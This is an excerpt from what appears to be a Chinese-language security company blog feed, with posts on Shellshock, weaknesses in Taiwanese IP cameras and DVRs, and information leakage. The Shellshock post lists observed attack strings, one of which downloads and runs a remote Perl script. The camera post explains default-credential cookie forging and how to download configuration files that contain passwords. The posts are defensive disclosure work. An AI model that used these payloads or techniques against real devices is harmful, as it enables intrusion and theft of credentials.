      &lt;td style=&quot;text-align: left&quot;&gt;NO &lt;sup id=&quot;fnref:note1&quot;&gt;&lt;a href=&quot;#fn:note1&quot; class=&quot;footnote&quot;&gt;2&lt;/a&gt;&lt;/sup&gt;&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;Synology&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;5.0-4493 update 7&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;NO (已修復)&lt;/td&gt;
    &lt;/tr&gt;
  &lt;/tbody&gt;
&lt;/table&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;h4 id=&quot;繞過-gitsubversion-伺服器的-shell-限制&quot;&gt;繞過 Git/Subversion 伺服器的 shell 限制&lt;/h4&gt;

&lt;p&gt;Shellshock 也常被利用來繞過伺服器的 shell 限制，最常見的就是 Git 和 Subversion 伺服器：&lt;br /&gt;
通常這些伺服器允許透過 SSH 連線，但登入後都對應著受限制的 shell。透過此漏洞，可以繞過 shell 的限制，執行指令如下圖。（註：OS 中 git user 預設 shell 要為 bash 才會受到影響）&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;/assets/img/blog/20140930/shellshock_test_git.png&quot;&gt;&lt;img src=&quot;/assets/img/blog/20140930/shellshock_test_git.png&quot; alt=&quot;繞過 Git/Subversion 伺服器的 shell 限制&quot; title=&quot;繞過 Git/Subversion 伺服器的 shell 限制&quot; /&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;一般我們要實作特定使用者登入 ssh 只能做特定的事情，常常會在 sshd_config 設定 ForceCommand，或是在 authorized_keys 設定 command= 如下：&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;command=&quot;[path]/gl-auth-command sitaram&quot;,[more options] ssh-rsa AAAAB3NzaC1yc2EAAAABIwAAAQEA18S2t...
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;這次會受到 Shellshock 影響，就是因為這些設定會在使用者透過 ssh 登入時，呼叫 bash 執行，當環境變數被引入，惡意的程式碼就會被執行了。&lt;/p&gt;

&lt;h3 id=&quot;shellshock-威脅仍在擴大&quot;&gt;Shellshock 威脅仍在擴大&lt;/h3&gt;

&lt;p&gt;目前不管是白帽駭客或是黑帽駭客都還在持續尋找可以利用 Shellshock 的地方，如同前面所述，找到可以寫入環境變數的地方，並且順利傳入 bash 執行，就可以利用該弱點來執行更進一步的攻擊。&lt;/p&gt;

&lt;p&gt;從 Shellshock 爆發至今，陸陸續續傳出了很多公司的產品受到此弱點影響，整理&lt;a href=&quot;http://www.kb.cert.org/vuls/byvendor?searchview&amp;amp;Query=FIELD+Reference=252743&amp;amp;SearchOrder=4&quot;&gt;在此&lt;/a&gt;，也有一些 POC 整理在&lt;a href=&quot;https://github.com/mubix/shellshocker-pocs/&quot;&gt;這裡&lt;/a&gt;。 其中不乏出現一些常用知名套件如：OpenVPN、Pure-FTPd，而且持續更新中。&lt;/p&gt;

&lt;p&gt;現在針對 HTTP 伺服器的攻擊還是佔多數，截至目前為止我們仍持續發現網路上有各種掃描樣本，例如：&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;() { :;}; /bin/bash -c &quot;echo testing9123123&quot;; /bin/uname -a&lt;/li&gt;
  &lt;li&gt;() { :;}; /bin/bash -c &quot;wget -P /var/tmp 174.143.2XX.XX/…/x ; perl /var/tmp/x&quot;&lt;/li&gt;
  &lt;li&gt;() { :;};echo vOLniO4dcLqW2I3MnIVpSfk8bmzyxXaIF$(echo vOLniO4dcLqW2I3MnIVpSfk8bmzyxXaIF)vOLniO4dcLqW2I3MnIVpSfk8bmzyxXaIF&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;除了這些陸續針對 HTTP 伺服器的案例，我們認為，一些公司購入的網路設備是 Shellshock 潛在高危險群，那些買來就擺在旁邊維運的設備，一來容易被忽略，二來是其更新不易，三來這些設備常使用到 bash，因此仍是現在惡意攻擊者專注研究的目標，請大家特別小心。&lt;/p&gt;

&lt;h3 id=&quot;結論無需過度恐慌但別掉以輕心&quot;&gt;結論：無需過度恐慌，但別掉以輕心&lt;/h3&gt;

&lt;p&gt;「只要有 bash 的系統全部都是受駭範圍！」&lt;/p&gt;

&lt;p&gt;不少朋友看到最近 Shellshock 的新聞報導，都十分緊張。儘管各位所使用的 bash 是含有漏洞的版本，但要成功執行攻擊手法需要許多條件，被攻擊者從遠端攻擊的機率偏低，因此大家不需要太過恐慌，只要注意以下設備或伺服器：&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;特定 Linux 版本，並且使用 DHCP 連線&lt;/li&gt;
  &lt;li&gt;網路、資安設備&lt;/li&gt;
  &lt;li&gt;使用 CGI 的網站伺服器&lt;/li&gt;
  &lt;li&gt;已經公布含有弱點的套件&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;那我們該怎麼自保呢？在攻擊手法不斷精進之下，只過濾 CVE-2014-6271 的攻擊字串並沒有辦法完全阻擋攻擊。建議可以先將伺服器的 bash 升級至最新版本，並持續關注後續更新訊息（目前持續有繞過檢查的新 CVE 弱點發佈），使用 CGI 之伺服器搭配 iptables、IDS、Mod Security 等機制偵測攻擊特徵並將其阻擋。若有設備在這次的影響範圍，也記得向原廠索取更新程式。&lt;/p&gt;

&lt;h3 id=&quot;題外話&quot;&gt;題外話&lt;/h3&gt;

&lt;p&gt;有人說：「Linux 在 2014 年接連出包，真是一個不安全的作業系統！反觀 Windows 在這幾次都毫無影響，企業應該要全面改用 Microsoft Solution！」，但這真的是正確的想法嗎？其實一個 OpenSource 的系統、軟體，可以藉由社群的力量檢視原始碼的問題，集合眾人的力量讓系統變得更加安全。因此有被揭露出漏洞，對於一個系統來說是好事。而非 OpenSource 的系統，就只能仰賴原廠自己的資安團隊進行研究，或者是外部資安人員的發掘了。選擇作業系統的原則，最好依照系統的功能需求、產品定位、安全漏洞的修補速度等層面，才能夠選用真正符合自己需要的系統。&lt;/p&gt;

&lt;h3 id=&quot;註解&quot;&gt;註解&lt;/h3&gt;

&lt;div class=&quot;footnotes&quot;&gt;
  &lt;ol&gt;
    &lt;li id=&quot;fn:note2&quot;&gt;
      &lt;p&gt;若手動執行 dhclient，則會遭到漏洞影響。 &lt;a href=&quot;#fnref:note2&quot; class=&quot;reversefootnote&quot;&gt;&amp;#8617;&lt;/a&gt; &lt;a href=&quot;#fnref:note2:1&quot; class=&quot;reversefootnote&quot;&gt;&amp;#8617;&lt;sup&gt;2&lt;/sup&gt;&lt;/a&gt;&lt;/p&gt;
    &lt;/li&gt;
    &lt;li id=&quot;fn:note1&quot;&gt;
      &lt;p&gt;系統環境變數會受到影響，但無法被攻擊者利用。 &lt;a href=&quot;#fnref:note1&quot; class=&quot;reversefootnote&quot;&gt;&amp;#8617;&lt;/a&gt;&lt;/p&gt;
    &lt;/li&gt;
  &lt;/ol&gt;
&lt;/div&gt;
</description>
                <link>https://devco.re/blog/2014/09/30/shellshock-CVE-2014-6271/</link>
                <guid>https://devco.re/blog/2014/09/30/shellshock-CVE-2014-6271</guid>
                <pubDate>Tue, 30 Sep 2014 00:00:00 +0800</pubDate>
        </item>

        <item>
                <title>網路攝影機、DVR、NVR 的資安議題 - 你知道我在看你嗎？</title>
                <description>&lt;p&gt;網路攝影機的普及率在近幾年來持續攀升，除了老人與幼兒居家照護、企業室內監控等需求迅速增加之外，結合手機應用程式讓人可隨時隨地觀看影像的方便性也成為普及的原因。當大家還以為黑帽駭客的目標仍然是網站、個人電腦時，已經有許多攻擊者悄悄地將目標轉向了各種物連網設備，例如 NAS、Wireless AP、Printer 等產品，而擁有眾多用戶的網路攝影機理所當然地也是目標之一。身為安控產品，卻造成一項資安的隱憂，是不是有點諷刺呢？&lt;/p&gt;

&lt;p&gt;恰好最近幾天忽然看到有新聞報導&lt;a href=&quot;http://news.ltn.com.tw/news/world/breakingnews/1112329&quot;&gt;「家用監視器遭駭客入侵 隱私全被看光光」&lt;/a&gt;這樣子的案例，而在去年也有類似的報導&lt;a href=&quot;http://news.networkmagazine.com.tw/classification/security/2013/06/18/51531/&quot;&gt;「數十萬支監控攝影機潛藏被駭漏洞 電影情景恐真實上演」&lt;/a&gt;，讓我們不禁想對這個事件做個深入的調查。就讓我們來看看網路攝影機以及相關產品究竟有哪些風險吧！&lt;/p&gt;

&lt;!-- more --&gt;

&lt;h3 id=&quot;cve&quot;&gt;CVE&lt;/h3&gt;

&lt;p&gt;我們先來看看幾個大廠在 2013 年到 2014 年之間有哪些已經被公開揭露的 CVE 弱點：&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;AVTECH: 3, CVE-2013-4980, CVE-2013-4981, CVE-2013-4982&lt;/li&gt;
  &lt;li&gt;AXIS: 2, CVE-2013-3543, CVE-2011-5261&lt;/li&gt;
  &lt;li&gt;Hikvision: 3, CVE-2013-4975, CVE-2013-4976, CVE-2013-4977&lt;/li&gt;
  &lt;li&gt;SONY: 1, CVE-2013-3539&lt;/li&gt;
  &lt;li&gt;Vivotek: 6, CVE-2013-1594, CVE-2013-1595, CVE-2013-1596, CVE-2013-1597, CVE-2013-1598, CVE-2013-4985&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;讀者們若進一步去看各個 CVE 的詳細資料，會發現有許多弱點都是屬於可執行任意指令的嚴重漏洞，其影響程度非常高，已不只是關於攝影內容是否被竊取，更有可能被利用此類設備進一步攻擊其他內、外網機器。&lt;/p&gt;

&lt;h3 id=&quot;台灣現況&quot;&gt;台灣現況&lt;/h3&gt;

&lt;p&gt;雖然上面提到許多知名廠牌的嚴重漏洞，但是每個國家使用的安控設備不見得都是上述幾個牌子，而身為資安業者，隨時關注自己國家的網路現況也是很合理的事情～在我們的大量觀測下，發現有許多 IP Camera、&lt;a href=&quot;http://en.wikipedia.org/wiki/Digital_video_recorder&quot;&gt;DVR (Digital Video Recoder)&lt;/a&gt;、&lt;a href=&quot;http://en.wikipedia.org/wiki/Network_Video_Recorder&quot;&gt;NVR (Network Video Recoder)&lt;/a&gt; 都存在資安議題，我們從其中提出幾個有趣的案例跟各位分享一下：&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;
    &lt;p&gt;某國外 V 牌廠商 （數量：320+）&lt;/p&gt;

    &lt;p&gt;一般的產品通常都會有預設帳號密碼，但這間廠商的產品似乎沒有預設帳號密碼，若使用者未設定帳號密碼，攻擊者只要直接點「OK」按鈕就可以登入系統，而這樣子的 DVR 在台灣有三百多台，也就是有三百多台 DVR 在網路上裸奔…&lt;a href=&quot;/assets/img/blog/20140924/case_study_01.png&quot;&gt;&lt;img src=&quot;/assets/img/blog/20140924/case_study_01.png&quot; alt=&quot;網路攝影機、DVR、NVR 案例 1&quot; title=&quot;網路攝影機、DVR、NVR 案例 1&quot; /&gt;&lt;/a&gt;&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;某國外 H 牌廠商 （數量：1200+）&lt;/p&gt;

    &lt;p&gt;有些廠商為了方便維修或者其他理由，會在 NVR 上開啟了 Telnet 服務，雖然增加了被攻擊的機率，但是若密碼強度足夠且沒有外流，也不會隨便被打進去。而這間廠商非常有趣，除了 root 帳號之外還有一組 guest 帳號，並且 guest 的密碼非常簡單，加上當初建置系統時並未檢查機敏檔案的權限是否設定錯誤，導致攻擊者可先用 guest 帳號登入，再去 /etc/shadow 讀取 root 密碼加以破解，進一步取得設備所有權限。&lt;a href=&quot;/assets/img/blog/20140924/case_study_02.png&quot;&gt;&lt;img src=&quot;/assets/img/blog/20140924/case_study_02.png&quot; alt=&quot;網路攝影機、DVR、NVR 案例 2&quot; title=&quot;網路攝影機、DVR、NVR 案例 2&quot; /&gt;&lt;/a&gt;&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;某國外 D 牌廠商 （數量：700+）&lt;/p&gt;

    &lt;p&gt;這個案例實在是令人哭笑不得，不知道是原廠還是台灣代理商非常好心地幫使用者建立了多組預設帳號，包含 admin、666666、888888 等等，而且密碼也設定得很簡單。但是通常要使用者記得改一組預設密碼已經非常困難，更何況是要使用者改三組密碼呢？這種情形導致攻擊者可以輕而易舉地拿著弱密碼到處猜，大大提高了用戶的受害機率。而更有趣的是，不知道是基於歷史包袱或者其他原因，此設備開了特殊的 port，直接送出含有特定內容的封包到這個 port 就可以執行相對應的指令，例如可以取得帳號密碼、使用者 email 等等，而在這個過程中完全沒有任何認證機制！等於又有七百多台 NVR 在網路上裸奔…&lt;a href=&quot;/assets/img/blog/20140924/case_study_03.png&quot;&gt;&lt;img src=&quot;/assets/img/blog/20140924/case_study_03.png&quot; alt=&quot;網路攝影機、DVR、NVR 案例 3&quot; title=&quot;網路攝影機、DVR、NVR 案例 3&quot; /&gt;&lt;/a&gt;&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;某國內 A 牌廠商 （數量：1000+）&lt;/p&gt;

    &lt;p&gt;這間廠商也是使用常見的預設帳號密碼，但它可怕的地方還不止於此。該系統將帳號密碼轉為 Base64 編碼後直接當作 cookie 內容，因此若預設帳號密碼分別是 abc 與 123，將 abc:123 用 Base64 編碼過後可得到 YWJjOjEyMw==，接著將 Cookie: SSID=YWJjOjEyMw== 這串內容加到 request 的 HTTP header 中，就可以到處測試該設備是否使用預設帳號密碼，甚至還可以進一步下載備份檔，察看使用者有無填寫 email、網路帳號密碼等資料。&lt;a href=&quot;/assets/img/blog/20140924/case_study_04.png&quot;&gt;&lt;img src=&quot;/assets/img/blog/20140924/case_study_04.png&quot; alt=&quot;網路攝影機、DVR、NVR 案例 4&quot; title=&quot;網路攝影機、DVR、NVR 案例 4&quot; /&gt;&lt;/a&gt;&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;某國內 A 牌廠商（數量：10+）&lt;/p&gt;

    &lt;p&gt;這個案例雖然數量非常少，但是卻非常嚴重。為什麼呢？因為廠商沒有對機敏資料做嚴格的權限控管，只要攻擊者直接在網址列輸入 http://IP/sys.bin，就可以直接下載一個名為 sys.bin 的檔案，而此檔案是 tgz 格式，解壓縮後可以得到 system_server.conf，該檔案中含有帳號、密碼，因此即便使用者修改了預設帳號密碼，也會因為這個嚴重漏洞而輕易地被入侵。&lt;a href=&quot;/assets/img/blog/20140924/case_study_05.png&quot;&gt;&lt;img src=&quot;/assets/img/blog/20140924/case_study_05.png&quot; alt=&quot;網路攝影機、DVR、NVR 案例 5&quot; title=&quot;網路攝影機、DVR、NVR 案例 5&quot; /&gt;&lt;/a&gt;&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;XXXX科技 （數量：230+）&lt;/p&gt;

    &lt;p&gt;這是一個非常經典的案例！一般攻擊者入侵攝影機最常見的就是為了偷看攝影機畫面，再進階一點的可能會控制該攝影機進一步攻擊內網。而這家廠商身為知名保全公司投資成立的安控公司，理當為客戶的監控畫面做最周全的規劃、最謹慎的防護，但是結果呢？報告各位，完全沒有任何防護！只要連到 IP 位址就可以直接看到攝影機畫面，也是屬於裸奔一族…&lt;/p&gt;
  &lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;從這幾個案例我們可以發現台灣目前至少有 3500 台左右的安控設備處於高風險狀態中，而由於我們無暇對每一款設備進行調查，因此這僅僅是一個概略的調查結果。同時這些設備都是在網路上可直接連線的，若再加上各個公家機關、辦公大樓、社區的內網安控設備，恐怕會有更驚人的發現。&lt;/p&gt;

&lt;h3 id=&quot;問題起源&quot;&gt;問題起源&lt;/h3&gt;

&lt;p&gt;究竟為什麼會有這麼多安控設備被入侵呢？其實主要有兩個面向。第一個是由於許多廠商的防範觀念仍停留在舊時代，不了解駭客到底都怎麼攻擊，因此也不了解確切的防治方法。舉例來說，廠商在網路安控系統的 Web 輸入介面都會設定許多阻擋規則，以防範入侵者輸入惡意攻擊指令，但是這些防治手段都僅僅做在 client 端（用 JavaScript 來防護），入侵者只要利用 proxy 工具或自行寫程式發送客製化 request 就可以繞過那些驗證，若廠商沒有在 server 端再次進行驗證輸入資料是否異常，就有很高的機會被入侵成功。&lt;/p&gt;

&lt;p&gt;另一方面則是入侵者的攻擊手法千變萬化，難以保證不會有新的 0-Day 弱點出現。例如今年一月份大量爆發的 NTP 弱點 CVE-2013-5211 就存在於上述六個案例其中之一，我想廠商應該不會有意願針對舊產品修復此類漏洞，也就是未來隨時有幾百台的攝影機可被惡意人士用來執行 DDoS 攻擊。另外今年四月份的 OpenSSL Heartbleed 弱點更是一個具有代表性的重要案例，我想這應該是許多安控設備廠商都會使用的程式。當廠商將此類程式納入網路安控設備中，於弱點被揭露時若無法及時有效修補，或是修補的成本太高導致用戶不願意修補、沒有能力修補，就有可能釀成重大災情，不但造成用戶損失，也嚴重影響商譽。&lt;/p&gt;

&lt;h3 id=&quot;廠商該如何因應&quot;&gt;廠商該如何因應？&lt;/h3&gt;

&lt;p&gt;針對此類資安問題，大型硬體廠商應該落實以下幾個動作：&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;改善資安問題更新流程：將產品的資安更新改變成主動通知使用者，而非需要使用者主動到官網看才知道更新，以縮短使用者更新的平均週期，確保使用者的軟體是最新無風險版本。&lt;/li&gt;
  &lt;li&gt;成立專門資安小組：請專人負責檢驗產品的資安品質與修正資安弱點，以便因應臨時爆發的重大弱點，維持產品的資安品質。&lt;/li&gt;
  &lt;li&gt;黑箱滲透測試：於產品出廠前執行黑箱滲透測試，讓滲透測試專家從黑帽駭客的角度來檢查產品有無漏洞。&lt;/li&gt;
  &lt;li&gt;白箱原始碼檢測：定期執行原始碼檢測，從產品的根本處著手改善，降低產品上市後才被發現弱點的機率。&lt;/li&gt;
  &lt;li&gt;資安教育訓練：請有實際攻防經驗的資安專家給予開發人員正確的資安觀念，了解最新的攻擊手法與有效防禦之道。&lt;/li&gt;
  &lt;li&gt;定期檢閱產品所使用的第三方軟體套件是否有弱點，例如 OpenSSL，以避免把有問題的版本納入產品，造成產品間接產生弱點，因而遭到入侵。&lt;/li&gt;
  &lt;li&gt;定時於網路上收集產品的相關弱點資料，例如 &lt;a href=&quot;http://secunia.com/&quot;&gt;Secunia&lt;/a&gt;、&lt;a href=&quot;http://www.securityfocus.com/&quot;&gt;SecurityFocus&lt;/a&gt;、&lt;a href=&quot;http://packetstormsecurity.com/&quot;&gt;Packet Storm&lt;/a&gt; 等網站都是很好的資訊來源。&lt;/li&gt;
&lt;/ul&gt;

&lt;h3 id=&quot;一般使用者企業該如何亡羊補牢&quot;&gt;一般使用者、企業該如何亡羊補牢？&lt;/h3&gt;

&lt;p&gt;目前的網路安控系統使用者仍未有足夠的資安意識，主要現象有以下幾點：&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;使用弱密碼&lt;/li&gt;
  &lt;li&gt;未進行適當的權限劃分與管理&lt;/li&gt;
  &lt;li&gt;容易開啓攻擊者寄送的惡意連結，導致被 XSS、CSRF 等手法攻擊&lt;/li&gt;
  &lt;li&gt;未限制連入 IP 位址，導致安控系統可從外網任意存取&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;然而，無論是安控系統或其他任何連網設備，未來都有可能成為潛在的攻擊目標，而且在廠商提供更新檔之前其實也很難確實地自保，因此了解資安知識與常見的攻擊手法是有其必要的。基本的防範之道如下：&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;使用強密碼，包含大小寫英文、數字、特殊符號，並且定期更換密碼&lt;/li&gt;
  &lt;li&gt;勿在系統建立太多不必要的使用者帳號、將多餘的帳號移除，以降低帳號被盜的機率。若需要建立多組帳號，請仔細給予適當的權限&lt;/li&gt;
  &lt;li&gt;勿隨意開啟可疑信件附帶的連結或檔案，以避免被攻擊者以 XSS、CSRF 等手法攻擊&lt;/li&gt;
  &lt;li&gt;限制可存取資訊系統的 IP 位址，避免資訊系統成為公開的攻擊目標&lt;/li&gt;
  &lt;li&gt;定期檢查 log，確認有無異常登入、異常操作甚至是異常帳號等資訊&lt;/li&gt;
&lt;/ul&gt;

&lt;h3 id=&quot;結論&quot;&gt;結論&lt;/h3&gt;

&lt;p&gt;在物連網的時代中，各種可進行無線通訊的設備被攻擊的事件屢見不鮮，例如 2011 年知名駭客 Jay Radcliffe 在 Black Hat 展示如何攻擊胰島素注射器，2013 年已故駭客 Barnaby Jack 原本要在 Black Hat 展示如何利用藍芽通訊控制心律調整器，甚至 2014 年甫推出的可遠程變換顏色燈泡也被揭露有資安問題。在不久的未來，這些資安問題只會更多，身為民眾、企業、廠商的你，準備好面對萬物皆可駭的物連網時代了嗎？&lt;/p&gt;
</description>
                <link>https://devco.re/blog/2014/09/24/security-of-ip-camera-and-nvr/</link>
                <guid>https://devco.re/blog/2014/09/24/security-of-ip-camera-and-nvr</guid>
                <pubDate>Wed, 24 Sep 2014 00:00:00 +0800</pubDate>
        </item>

        <item>
                <title>被遺忘的資訊洩漏－重點回顧</title>
                <description>&lt;h3 id=&quot;前言&quot;&gt;前言&lt;/h3&gt;

&lt;p&gt;在今年駭客年會企業場，我們分享了一場『被遺忘的資訊洩漏』。資訊洩漏是十幾年前就被一提再提的議題，在資訊安全領域中也是最最最基本該注意的事情，然而至今很多網站都還是忽略它，甚至連一些熱門網站都仍有資訊洩漏問題。議程中我們舉了大量的例子證明資訊洩漏其實可以很嚴重，希望能幫大家複習一下，如果網站沒有注意這些，會造成什麼樣的後果。議程投影片如下所示，就讓我們來總結一下吧！&lt;/p&gt;

&lt;!-- more --&gt;

&lt;center&gt;&lt;iframe src=&quot;http://www.slideshare.net/slideshow/embed_code/38312258&quot; width=&quot;560&quot; height=&quot;460&quot; frameborder=&quot;0&quot; marginwidth=&quot;0&quot; marginheight=&quot;0&quot; scrolling=&quot;no&quot; style=&quot;border:1px solid #CCC; border-width:1px; margin-bottom:5px; max-width: 100%;&quot;&gt; &lt;/iframe&gt;&lt;/center&gt;
&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;h3 id=&quot;devcore-常利用的資訊洩漏&quot;&gt;DEVCORE 常利用的資訊洩漏&lt;/h3&gt;

&lt;p&gt;首先我們從過往滲透測試經驗中挑選了幾個常見的資訊洩漏問題，分別如下：&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;管理介面洩漏 (p8-p19)&lt;/li&gt;
  &lt;li&gt;目錄(Index of)洩漏 (p20-p28)&lt;/li&gt;
  &lt;li&gt;錯誤訊息洩漏 (p29-p35)&lt;/li&gt;
  &lt;li&gt;暫存、測試資訊 (p36-p46)&lt;/li&gt;
  &lt;li&gt;版本控管 (p47-p55)&lt;/li&gt;
  &lt;li&gt;DNS 資訊洩漏 (p56-p63)&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;以上種種不同洩漏方式，可能會洩漏出系統環境資訊、程式碼內容、含有帳號密碼的設定檔等。透過這些資訊，駭客就能組織出一個有效的攻擊行動。我們甚至在過往的經驗中，只透過目標的資訊洩漏，就直接取得資料庫操作權限(詳見投影片 p65-p71)。&lt;/p&gt;

&lt;p&gt;為了解目前一些熱門網站是否重視這些最基本的保護，我們實際對 alexa 台灣前 525 名的網站進行資訊洩漏的調查。&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20140826/phpmyadmin_leak.jpg&quot; alt=&quot;phpmyadmin 頁面洩漏狀況&quot; /&gt;&lt;br /&gt;
&lt;img src=&quot;/assets/img/blog/20140826/phpinfo_leak.jpg&quot; alt=&quot;phpinfo 頁面洩漏狀況&quot; /&gt;&lt;/p&gt;

&lt;p&gt;在管理介面和測試頁面洩漏的項目，我們用很保守的方式測試根目錄下是否存有 phpmyadmin 和 phpinfo 頁面，結果分別有 7% 和 9% 的網站有這樣的問題。這樣的結果非常令人訝異，畢竟受測網站都是知名且有技術力的網站，而且並非所有網站都使用 php 開發，再加上我們只是測試預設的命名，實際洩漏的情況會更多！&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20140826/version_control_leak.jpg&quot; alt=&quot;版本控制洩漏狀況&quot; /&gt;&lt;/p&gt;

&lt;p&gt;另一個值得一提的是版本控管洩漏問題，我們同樣保守的只針對版本控管軟體中 GIT 和 SVN 兩項進行調查。結果竟然有 10% 的網站有這樣的問題。這個現象非常嚴重！這個現象非常嚴重！這個現象非常嚴重！這個洩漏有機會能還原整個服務的原始碼，被攻擊成功的機率相當高！台灣熱門的網站裡，十個裡面就有一個存有這樣的問題，非常危險，煩請看到這篇文章的朋友能去注意貴公司的網站是否存在這樣的問題。&lt;/p&gt;

&lt;h3 id=&quot;大數據資料蒐集&quot;&gt;大數據資料蒐集&lt;/h3&gt;

&lt;p&gt;在這場議程中，我們還提到了另一個層次的資訊洩漏議題：當全世界主機的服務及版本資訊全部都被收集起來，會發生什麼樣的事情？&lt;/p&gt;

&lt;p&gt;駭客擁有這樣的資料，就能夠在非常短暫的時間內篩選出有問題的主機，進行大量的入侵。我們利用類似的技術針對台灣主機快速的進行掃描，就發現了台灣有 61414 台主機可以被利用來做 DNS Amplification DDoS 攻擊、1003 台主機可以被利用來做 NTP Amplification DDoS 攻擊。也就是說，駭客可以在短時間內組織一支六萬多人的台灣大軍，可以針對他想要攻擊的目標進行攻擊。&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20140826/heartbleed.jpg&quot; alt=&quot;OpenSSL Heartbleed 尚未修復的狀況&quot; /&gt;&lt;/p&gt;

&lt;p&gt;利用相同的技術，我們也順便檢驗了前陣子非常熱門的 &lt;a href=&quot;http://devco.re/blog/2014/04/09/openssl-heartbleed-CVE-2014-0160/&quot;&gt;OpenSSL Heartbleed&lt;/a&gt; 問題。OpenSSL Heartbleed 被稱之為『近十年網路最嚴重的安全漏洞』，其嚴重程度可以想見，然而根據我們的觀察，台灣至今仍有 1480 台 HTTP 伺服器尚未修復，而台灣前 525 大熱門網站中，也有 21 個(4%)網站未修復。足見台灣網站對於資安的意識仍然不夠。&lt;/p&gt;

&lt;p&gt;對於這樣海量收集資料衍生的資安議題，我們認為最大的受害者，是物聯網的使用者！就我們的觀察，物聯網的設備通常安全防護不佳，容易遭受到駭客攻擊，前陣子 &lt;a href=&quot;http://www8.hp.com/us/en/hp-news/press-release.html?id=1744676&quot;&gt;HP 也出了一份報告指出&lt;/a&gt;，物聯網的設備有七成存在弱點，而且每台設備平均有 25 個弱點。除此之外，物聯網的設備不易更新，少有人會定期更新，更導致物聯網設備可以被大範圍的攻擊，進而滲透家用網路，危害使用者居家隱私。這是個未來需要持續關注的重要議題。&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20140826/synolocker.jpg&quot; alt=&quot;仍暴露在 SynoLocker 風險狀況統計&quot; /&gt;&lt;/p&gt;

&lt;p&gt;最後，我們用最近 SynoLocker 的案例為大數據資料蒐集作結，SynoLocker 是一款針對 Synology 的勒索軟體，去年底 Synology 官方已經推出新版修正問題，本月 SynoLocker 擴散至全世界，新聞一再強調需要更新 NAS，但我們針對台灣 1812 台對外開放的 Synology NAS 做統計，至今仍發現有 64％ 的使用者沒有更新，也就是這些 NAS 仍暴露在 SynoLocker 的風險中。這件事情又再次證明駭客有能力在短時間利用大數據資料找到攻擊目標，也順帶說明了台灣資安意識普遍不足的問題。&lt;/p&gt;

&lt;h3 id=&quot;結論&quot;&gt;結論&lt;/h3&gt;

&lt;p&gt;在這次議題我們關注了很古老的資訊洩漏問題，並且發現目前台灣一些熱門網站仍然存在這樣的問題。資訊洩漏也許不是一件很嚴重的事情，但往往能激起駭客高漲的情緒，駭客會認為一個網站連最最最基本的資料保護都沒有做到，一定會存在其他資安問題，進而進行更大量的攻擊行為。而事實上，我們也從實例證明了其實資訊洩漏可以很嚴重，希望網站提供者能夠注重這個簡單可解決且重要的議題。&lt;/p&gt;

&lt;p&gt;我們也提到了駭客透過平常大量的資料收集，在需要的時候能快速找到目標並且大範圍攻擊。這其中又以物聯網的用戶影響最多。面對這樣的議題，我們建議除了適當的隱藏(偽造)主機版本資訊以避免出現 0-Day 時成為首要攻擊目標。我們也提倡要對自己的服務做普查，了解自己到底對外開啟了什麼服務，以及關注自己使用的&lt;a href=&quot;http://devco.re/blog/2014/03/14/3rd-party-software-security-issues/&quot;&gt;第三方套件&lt;/a&gt;是否有安全更新。&lt;/p&gt;

&lt;p&gt;希望明年不需要再有一篇『依舊沒改變的資訊洩漏』！大家快點注意這件簡單的事情吧！&lt;/p&gt;

</description>
                <link>https://devco.re/blog/2014/08/26/information-leakage-in-taiwan-HITCON2014/</link>
                <guid>https://devco.re/blog/2014/08/26/information-leakage-in-taiwan-HITCON2014</guid>
                <pubDate>Tue, 26 Aug 2014 00:00:00 +0800</pubDate>
        </item>

        <item>
                <title>手機應用程式開發上被忽略的 SSL 處理</title>
                <description>&lt;p&gt;在網路上傳輸敏感資訊時，通常會使用 HTTPS 協定，讓客戶端與伺服器端對資料進行 SSL 加密處理，以降低資料在傳輸過程中被監聽或中間人攻擊的風險。HTTPS 的重要性逐漸被重視，Google 除了預設開啟 HTTPS 之外，未來更會將 &lt;a href=&quot;http://googlewebmastercentral.blogspot.tw/2014/08/https-as-ranking-signal.html&quot;&gt;HTTPS 的網站搜尋排名加分&lt;/a&gt;。但為了確保傳輸的安全，過程中客戶端會核對伺服器的憑證鏈 (certificate chain) 是否有效，若判定為無效時會作出警告。(詳見&lt;a href=&quot;http://en.wikipedia.org/wiki/Secure_Sockets_Layer&quot;&gt;Wikipedia&lt;/a&gt;)&lt;/p&gt;

&lt;!-- more --&gt;
